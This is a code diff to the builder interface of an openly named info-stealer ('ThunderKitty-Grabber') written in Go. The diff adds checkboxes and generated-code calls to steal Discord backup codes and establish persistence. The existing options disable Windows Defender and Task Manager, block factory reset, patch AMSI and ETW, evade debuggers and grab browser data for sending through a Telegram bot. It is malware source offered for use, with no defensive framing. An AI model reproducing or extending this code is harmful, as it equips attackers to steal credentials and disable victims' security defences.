@@ -14,7 +14,7 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell bool) {
+func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell, enablePersistence, stealBackupCodes bool) {
 	content := fmt.Sprintf(`
 package main
 
@@ -24,8 +24,10 @@ import (
 	"ThunderKitty-Grabber/utils/fakeerror"
 	"ThunderKitty-Grabber/utils/browsers"
 	"ThunderKitty-Grabber/utils/hideconsole"
+	"ThunderKitty-Grabber/utils/backupcodes"
 	"ThunderKitty-Grabber/utils/disablefactoryreset"
 	"ThunderKitty-Grabber/utils/taskmanager"
+	"ThunderKitty-Grabber/utils/persistence"
 	"ThunderKitty-Grabber/utils/exclude"
 	"ThunderKitty-Grabber/utils/defender"
 	"ThunderKitty-Grabber/utils/powershellpatcher"
@@ -40,12 +42,12 @@ const (
 
 func main() {
 	if %t {
-		HideConsoleWindow.HideWindow()
+		go HideConsoleWindow.HideWindow()
 	} else {
 		fmt.Println("Console window not hidden")
 	}
  	if %t {
-		AntiDebugVMAnalysis.ThunderKitty()
+		go AntiDebugVMAnalysis.ThunderKitty()
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
@@ -55,27 +57,39 @@ func main() {
 		fmt.Println("Fake error not enabled")
 	}
 
-	Exclude.FileExtensions()
-	Defender.Disable()
+	go Exclude.ExcludeDrive()
+	go Defender.Disable()
 
-	SysInfo.Fetch()
+	go SysInfo.Fetch()
 
 	if %t {
-		browsers.ThunderKittyGrab(telebottoken, telechatid)
+		go browsers.ThunderKittyGrab(telebottoken, telechatid)
 	} else {
 		fmt.Println("Browser info grabbing not enabled")
 	}
 
 	if %t {
-		FactoryReset.Disable()
+		go BackupCodes.Search()
+	} else {
+		fmt.Println("Discord backup code recovery disabled")
+	}
+
+	if %t {
+		go FactoryReset.Disable()
 	} else {
 		fmt.Println("Factory reset not disabled")
 	}
 
 	if %t {
-		TaskManager.Disable()
+		go TaskManager.Disable()
 	} else {
 		fmt.Println("Task manager not disabled")
+	}
+
+	if %t {
+		Persistence.Create()
+	} else {
+		fmt.Println("Persistence not enabled")
 	}
 	
 	url := "%s"
@@ -99,12 +113,12 @@ func main() {
 	}
 
 	if %t {
-		PowerShellPatcher.Patch()
+		go PowerShellPatcher.Patch()
 	} else {
 		fmt.Println("PowerShell patcher not enabled")
 	}
 }
-`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell)
+`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, stealBackupCodes, disableFactoryReset, disableTaskManager, enablePersistence, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell)
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -172,10 +186,12 @@ func main() {
 	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
 	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
 	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
+	stealBackupCodes := widget.NewCheck("Steal Discord Backup Codes", nil)
 	hideConsole := widget.NewCheck("Hide Console Window", nil)
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
 	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
+	enablePersistence := widget.NewCheck("Enable Persistence", nil)
 
 	// Trollware Widgets
 	openSiteEntry := widget.NewEntry()
@@ -200,7 +216,7 @@ func main() {
 		openSiteURL := openSiteEntry.Text
 		speakTTSMessage := speakTTSEntry.Text
 		filePumperSize := filePumperEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked)
+		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked, enablePersistence.Checked, stealBackupCodes.Checked)
 
 		// Pumper
 		if filePumperSize != "" {
@@ -220,10 +236,12 @@ func main() {
 		enableAntiDebug,
 		enableFakeError,
 		enableBrowsers,
+		stealBackupCodes,
 		hideConsole,
 		disableFactoryReset,
 		disableTaskManager,
 		patchPowershell,
+		enablePersistence,
 		buildButton,
 	)
 
